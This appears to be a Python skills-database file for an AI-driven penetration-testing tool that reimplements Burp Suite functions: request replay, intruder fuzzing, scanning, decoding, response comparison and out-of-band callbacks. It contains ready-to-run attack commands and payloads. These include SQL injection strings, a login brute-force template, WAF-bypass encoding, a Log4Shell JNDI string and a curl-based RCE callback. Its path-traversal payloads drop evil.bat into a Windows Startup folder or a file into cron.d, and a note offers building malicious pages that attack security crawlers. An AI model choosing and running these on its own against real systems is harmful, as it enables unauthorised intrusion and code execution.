"""
Burp Engine 스킬 데이터 — bingo 내장
=====================================
Burp Suite 없이 동일 기능을 Python으로 직접 실행.
Community / Pro 구분 없음. 로컬 Burp 실행 불필요.

AI 자동 선택 조건:
  - "Burp", "리피터", "인트루더", "스캐너" 언급
  - 페이로드 퍼징 / 대량 요청 필요
  - SSRF·XXE·RCE OOB 탐지 필요
  - 두 응답 비교 필요
  - 인코딩/디코딩 변환 필요

EN: AI auto-selects when Burp-like features needed without Burp installed.
ZH: 需要Burp功能但未安装Burp时AI自动选择。
"""

SKILLS_DB_5: dict[str, dict] = {

"burp-repeater": {
    "name": "Repeater — 요청 재전송 + 수정",
    "module": "BurpEngine",
    "tags": ["repeater", "http", "request", "replay", "modify", "burp"],
    "desc": (
        "Burp Repeater 대체. HTTP 요청을 정확히 재전송하고 헤더/바디/파라미터 수정. "
        "Burp 없이 동작. Community 가능.\n"
        "EN: Burp Repeater equivalent. Replay HTTP requests with header/body modifications. No Burp needed.\n"
        "ZH: Burp Repeater替代。重放HTTP请求并修改头/body/参数。无需Burp。"
    ),
    "tools": ["burp_engine.repeater", "burp_engine.repeater_report"],
    "commands": [
        # GET 요청
        "python3 -c \"from bingo.tools.burp_engine import repeater,repeater_report; "
        "print(repeater_report(repeater('GET','https://TARGET/path?id=1')))\"",
        # POST 요청
        "python3 -c \"from bingo.tools.burp_engine import repeater,repeater_report; "
        "r=repeater('POST','https://TARGET/login',body='user=admin&pass=test',"
        "headers={'Content-Type':'application/x-www-form-urlencoded'}); print(repeater_report(r))\"",
        # 커스텀 헤더
        "from bingo.tools.burp_engine import repeater; "
        "repeater('GET','https://TARGET/',headers={'X-Forwarded-For':'127.0.0.1','Cookie':'session=abc'})",
    ],
    "payloads": [],
    "notes": (
        "follow_redirects=False로 리다이렉트 추적 끄기 가능\n"
        "proxy='http://127.0.0.1:8080' 로 실제 Burp 프록시 경유도 가능\n"
        "elapsed(응답시간)으로 time-based SQLi 측정 가능"
    ),
},

"burp-intruder": {
    "name": "Intruder — 페이로드 위치 기반 자동 퍼징",
    "module": "BurpEngine",
    "tags": ["intruder", "fuzzing", "bruteforce", "payload", "burp", "sniper", "cluster-bomb"],
    "desc": (
        "Burp Intruder 대체. §payload§ 마커 위치에 페이로드 자동 삽입. "
        "Sniper/Battering Ram/Pitchfork/Cluster Bomb 4가지 모드. 멀티스레드.\n"
        "EN: Burp Intruder equivalent. Insert payloads at §payload§ markers. 4 attack modes, multi-threaded.\n"
        "ZH: Burp Intruder替代。在§payload§标记处插入payload。4种攻击模式，多线程。"
    ),
    "tools": ["burp_engine.intruder", "burp_engine.intruder_report"],
    "commands": [
        # SQLi 퍼징 (Sniper)
        "python3 -c \""
        "from bingo.tools.burp_engine import intruder, intruder_report; "
        "payloads = [\\\"'\\\", \\\"' OR '1'='1\\\", \\\"' AND SLEEP(3)--\\\", \\\"1 UNION SELECT NULL--\\\"]; "
        "hits = intruder('GET','https://TARGET/page?id=§payload§',[payloads],mode='sniper',threads=3); "
        "print(intruder_report(hits))\"",
        # 로그인 브루트포스 (Cluster Bomb)
        "python3 -c \""
        "from bingo.tools.burp_engine import intruder, intruder_report; "
        "users=['admin','root','test']; pws=['1234','admin','password']; "
        "hits = intruder('POST','https://TARGET/login',[users,pws],"
        "body_template='user=§payload§&pass=§payload§',mode='cluster_bomb',filter_status=[200,302]); "
        "print(intruder_report(hits))\"",
    ],
    "payloads": [
        "§payload§",   # URL/POST body에 삽입할 마커
    ],
    "notes": (
        "모드:\n"
        "  sniper       : 위치 하나씩 돌아가며 각 페이로드 삽입\n"
        "  battering_ram: 모든 위치에 동일 페이로드 동시 삽입\n"
        "  pitchfork    : 각 위치에 대응하는 페이로드 세트 (zip)\n"
        "  cluster_bomb : 모든 조합 (cartesian product)\n"
        "filter_status=[200,302]로 관심 상태코드만 필터\n"
        "filter_len_diff=50으로 응답 길이 차이 ≥50인 것만 출력"
    ),
},

"burp-scanner": {
    "name": "Scanner — 수동+능동 취약점 자동 스캔",
    "module": "BurpEngine",
    "tags": ["scanner", "scan", "sqli", "xss", "ssti", "passive", "active", "burp"],
    "desc": (
        "Burp Scanner 대체. 수동(응답 헤더/바디 패턴) + 능동(SQLi/XSS/SSTI 페이로드 삽입) 스캔. "
        "Burp Pro 없이 동작.\n"
        "EN: Burp Scanner equivalent. Passive (header/body analysis) + Active (SQLi/XSS/SSTI) scanning without Burp Pro.\n"
        "ZH: Burp Scanner替代。被动(头/body分析)+主动(SQLi/XSS/SSTI)扫描，无需Burp Pro。"
    ),
    "tools": ["burp_engine.scanner_passive", "burp_engine.scanner_active", "burp_engine.full_scan"],
    "commands": [
        # 빠른 전체 스캔
        "python3 -c \"from bingo.tools.burp_engine import full_scan; print(full_scan('https://TARGET/page?id=1'))\"",
        # 수동 스캔만
        "python3 -c \""
        "from bingo.tools.burp_engine import scanner_passive, scanner_report; "
        "print(scanner_report(scanner_passive('https://TARGET/')))\"",
        # 능동 스캔 (특정 파라미터)
        "python3 -c \""
        "from bingo.tools.burp_engine import scanner_active, scanner_report; "
        "print(scanner_report(scanner_active('https://TARGET/search?q=test',params=['q'])))\"",
    ],
    "payloads": [],
    "notes": (
        "수동 스캔 탐지 항목:\n"
        "  - X-Frame-Options / CSP / HSTS 누락\n"
        "  - Server/PHP 버전 노출\n"
        "  - Stack Trace / 에러 메시지 노출\n"
        "능동 스캔 탐지 항목:\n"
        "  - SQLi (에러 기반 + 시간 기반)\n"
        "  - XSS (반사형)\n"
        "  - SSTI ({{7*7}} → 49 패턴)"
    ),
},

"burp-decoder": {
    "name": "Decoder — 모든 인코딩 자동 변환",
    "module": "BurpEngine",
    "tags": ["decoder", "encode", "decode", "base64", "url", "hex", "html", "burp"],
    "desc": (
        "Burp Decoder 대체. Base64/URL/HTML/Hex/Gzip 인코딩 전환 자동화. "
        "페이로드 인코딩 / WAF 우회용.\n"
        "EN: Burp Decoder equivalent. Auto-convert Base64/URL/HTML/Hex/Gzip encodings. WAF bypass encoding.\n"
        "ZH: Burp Decoder替代。自动转换Base64/URL/HTML/Hex/Gzip编码。WAF绕过编码。"
    ),
    "tools": ["burp_engine.decoder", "burp_engine.decoder_report"],
    "commands": [
        "python3 -c \""
        "from bingo.tools.burp_engine import decoder, decoder_report; "
        "print(decoder_report(decoder(\\\"' OR 1=1--\\\")))\"",
        # Base64 디코드
        "python3 -c \""
        "from bingo.tools.burp_engine import decoder; "
        "print(decoder('YWRtaW46YWRtaW4=')['base64_decode'])\"",
    ],
    "payloads": [],
    "notes": (
        "변환 목록:\n"
        "  encode: base64, url, url_all(%XX 전체), html, hex, hex_0x(\\xNN)\n"
        "  decode: base64, url, html, hex, gzip+base64\n"
        "WAF 우회: url_encode_all로 전체 문자를 %XX 형태로 변환"
    ),
},

"burp-comparer": {
    "name": "Comparer — 두 응답 비교",
    "module": "BurpEngine",
    "tags": ["comparer", "diff", "compare", "response", "boolean-sqli", "burp"],
    "desc": (
        "Burp Comparer 대체. 두 HTTP 응답의 길이·내용 차이 자동 분석. "
        "Boolean SQLi 확인, 인증 전후 비교에 활용.\n"
        "EN: Burp Comparer equivalent. Diff two HTTP responses. Useful for boolean SQLi, auth comparison.\n"
        "ZH: Burp Comparer替代。对比两个HTTP响应。用于布尔SQLi确认、认证前后比较。"
    ),
    "tools": ["burp_engine.comparer", "burp_engine.comparer_report"],
    "commands": [
        "python3 -c \""
        "from bingo.tools.burp_engine import repeater, comparer, comparer_report; "
        "a = repeater('GET','https://TARGET/page?id=1 AND 1=1--').body; "
        "b = repeater('GET','https://TARGET/page?id=1 AND 1=2--').body; "
        "print(comparer_report(comparer(a,b)))\"",
    ],
    "payloads": [],
    "notes": (
        "len_diff ≥ 50 → Boolean SQLi 취약점 강력 의심\n"
        "identical=True → WAF가 같은 응답 반환 (False Positive 가능성)"
    ),
},

"burp-oob-collaborator": {
    "name": "OOB Collaborator — interactsh Out-of-Band 탐지",
    "module": "BurpEngine",
    "tags": ["oob", "collaborator", "ssrf", "xxe", "rce", "dns", "interactsh", "burp", "out-of-band"],
    "desc": (
        "Burp Collaborator 대체. interactsh 서버로 SSRF/XXE/RCE OOB 콜백 탐지. "
        "Burp Pro 없이 동작. Log4Shell 페이로드 자동 생성 포함.\n"
        "EN: Burp Collaborator equivalent via interactsh. Detect SSRF/XXE/RCE OOB callbacks without Burp Pro. Log4Shell included.\n"
        "ZH: 通过interactsh替代Burp Collaborator。检测SSRF/XXE/RCE OOB回调，无需Burp Pro，含Log4Shell payload。"
    ),
    "tools": ["burp_engine.CollaboratorClient"],
    "commands": [
        "python3 -c \""
        "from bingo.tools.burp_engine import CollaboratorClient; "
        "c = CollaboratorClient(); "
        "payloads = c.oob_payloads(); "
        "[print(f'{k}: {v}') for k,v in payloads.items()]\"",
        # SSRF 테스트 후 콜백 확인
        "python3 -c \""
        "from bingo.tools.burp_engine import CollaboratorClient, repeater; "
        "c = CollaboratorClient(); url = c.oob_payloads()['ssrf_url']; "
        "repeater('GET', f'https://TARGET/fetch?url={url}'); "
        "hits = c.poll(wait=5); print('OOB hits:', hits)\"",
    ],
    "payloads": [
        "${jndi:ldap://COLLAB_DOMAIN/a}",      # Log4Shell
        "http://COLLAB_DOMAIN/ssrf",            # SSRF
        "<!ENTITY xxe SYSTEM 'http://COLLAB_DOMAIN/'>",  # XXE
        "`curl http://COLLAB_DOMAIN/rce`",      # RCE
    ],
    "notes": (
        "interactsh 공개 서버: interact.sh / oast.fun / oast.me / oast.site\n"
        "pip install pycryptodome (선택적, 없어도 공개 서버 직접 사용 가능)\n"
        "Log4Shell: ${jndi:ldap://DOMAIN/a} → 취약 서버가 DNS/LDAP 요청 발생\n"
        "poll(wait=10)으로 충분한 대기시간 확보"
    ),
},

"burp-file-input-traversal": {
    "name": "File Input Path Traversal 탐지 (HackerOne #3712279)",
    "module": "BurpEngine",
    "tags": [
        "path-traversal", "file-upload", "file-input", "crawler", "scanner-rce",
        "burp", "hackerone", "cve", "upload", "traversal",
    ],
    "desc": (
        "HackerOne #3712279 (PortSwigger Burp RCE) 기법 응용. "
        "<input type='file' accept='./../../../../Startup/evil.bat'> 패턴 탐지. "
        "페이지 내 파일 입력 accept/value 속성 path traversal + 서버측 업로드 핸들러 검증.\n"
        "EN: Detect path traversal in <input type='file'> accept/value attributes. "
        "Based on HackerOne #3712279 — Burp Suite RCE via browser crawler file input handling. "
        "Also validates server-side upload handler for directory escape.\n"
        "ZH: 检测<input type='file'>的accept/value属性路径穿越。"
        "基于HackerOne #3712279（Burp爬虫文件输入RCE）。同时验证服务端上传处理器目录逃逸。"
    ),
    "tools": [
        "burp_engine.scan_file_input_traversal",
        "burp_engine.file_input_traversal_report",
    ],
    "commands": [
        # 단일 URL 탐지
        "python3 -c \""
        "from bingo.tools.burp_engine import scan_file_input_traversal, file_input_traversal_report; "
        "print(file_input_traversal_report(scan_file_input_traversal('https://TARGET/upload')))\"",
        # full_scan에 자동 포함
        "python3 -c \"from bingo.tools.burp_engine import full_scan; print(full_scan('https://TARGET/'))\"",
    ],
    "payloads": [
        "./../../../../Roaming/Microsoft/Windows/Start Menu/Programs/Startup/evil.bat",
        "../../../etc/cron.d/evil",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows%2fsystem32%2fevil.dll",
        "../evil.txt",
    ],
    "notes": (
        "탐지 대상:\n"
        "  1. <input type='file'> accept 속성의 ../  %2e%2e/ Startup Roaming 등 경로 탈출 패턴\n"
        "  2. value 속성의 path traversal 문자열\n"
        "  3. 서버측 업로드 핸들러에 ../evil.txt 파일명으로 multipart 업로드 시도\n"
        "원리 (HackerOne #3712279):\n"
        "  Burp 크롤러가 accept 속성값을 로컬 파일 경로로 Path.resolve() → Startup 폴더에 .bat 파일 생성 → 재로그인 시 RCE\n"
        "bingo 적용:\n"
        "  - 취약한 웹 앱이 파일 입력 accept/value 를 서버에서 그대로 사용하는 경우 탐지\n"
        "  - 보안 도구(크롤러/스캐너)를 공격하는 악성 페이지 생성에도 활용 가능"
    ),
},

}  # SKILLS_DB_5 end


MODULE_INDEX_5: dict[str, list[str]] = {
    "BurpEngine": list(SKILLS_DB_5.keys()),
    "SecSkills-Web": list(SKILLS_DB_5.keys()),
}

TAG_INDEX_5: dict[str, list[str]] = {}
for _sid, _sdata in SKILLS_DB_5.items():
    for _tag in _sdata.get("tags", []):
        if _tag not in TAG_INDEX_5:
            TAG_INDEX_5[_tag] = []
        TAG_INDEX_5[_tag].append(_sid)
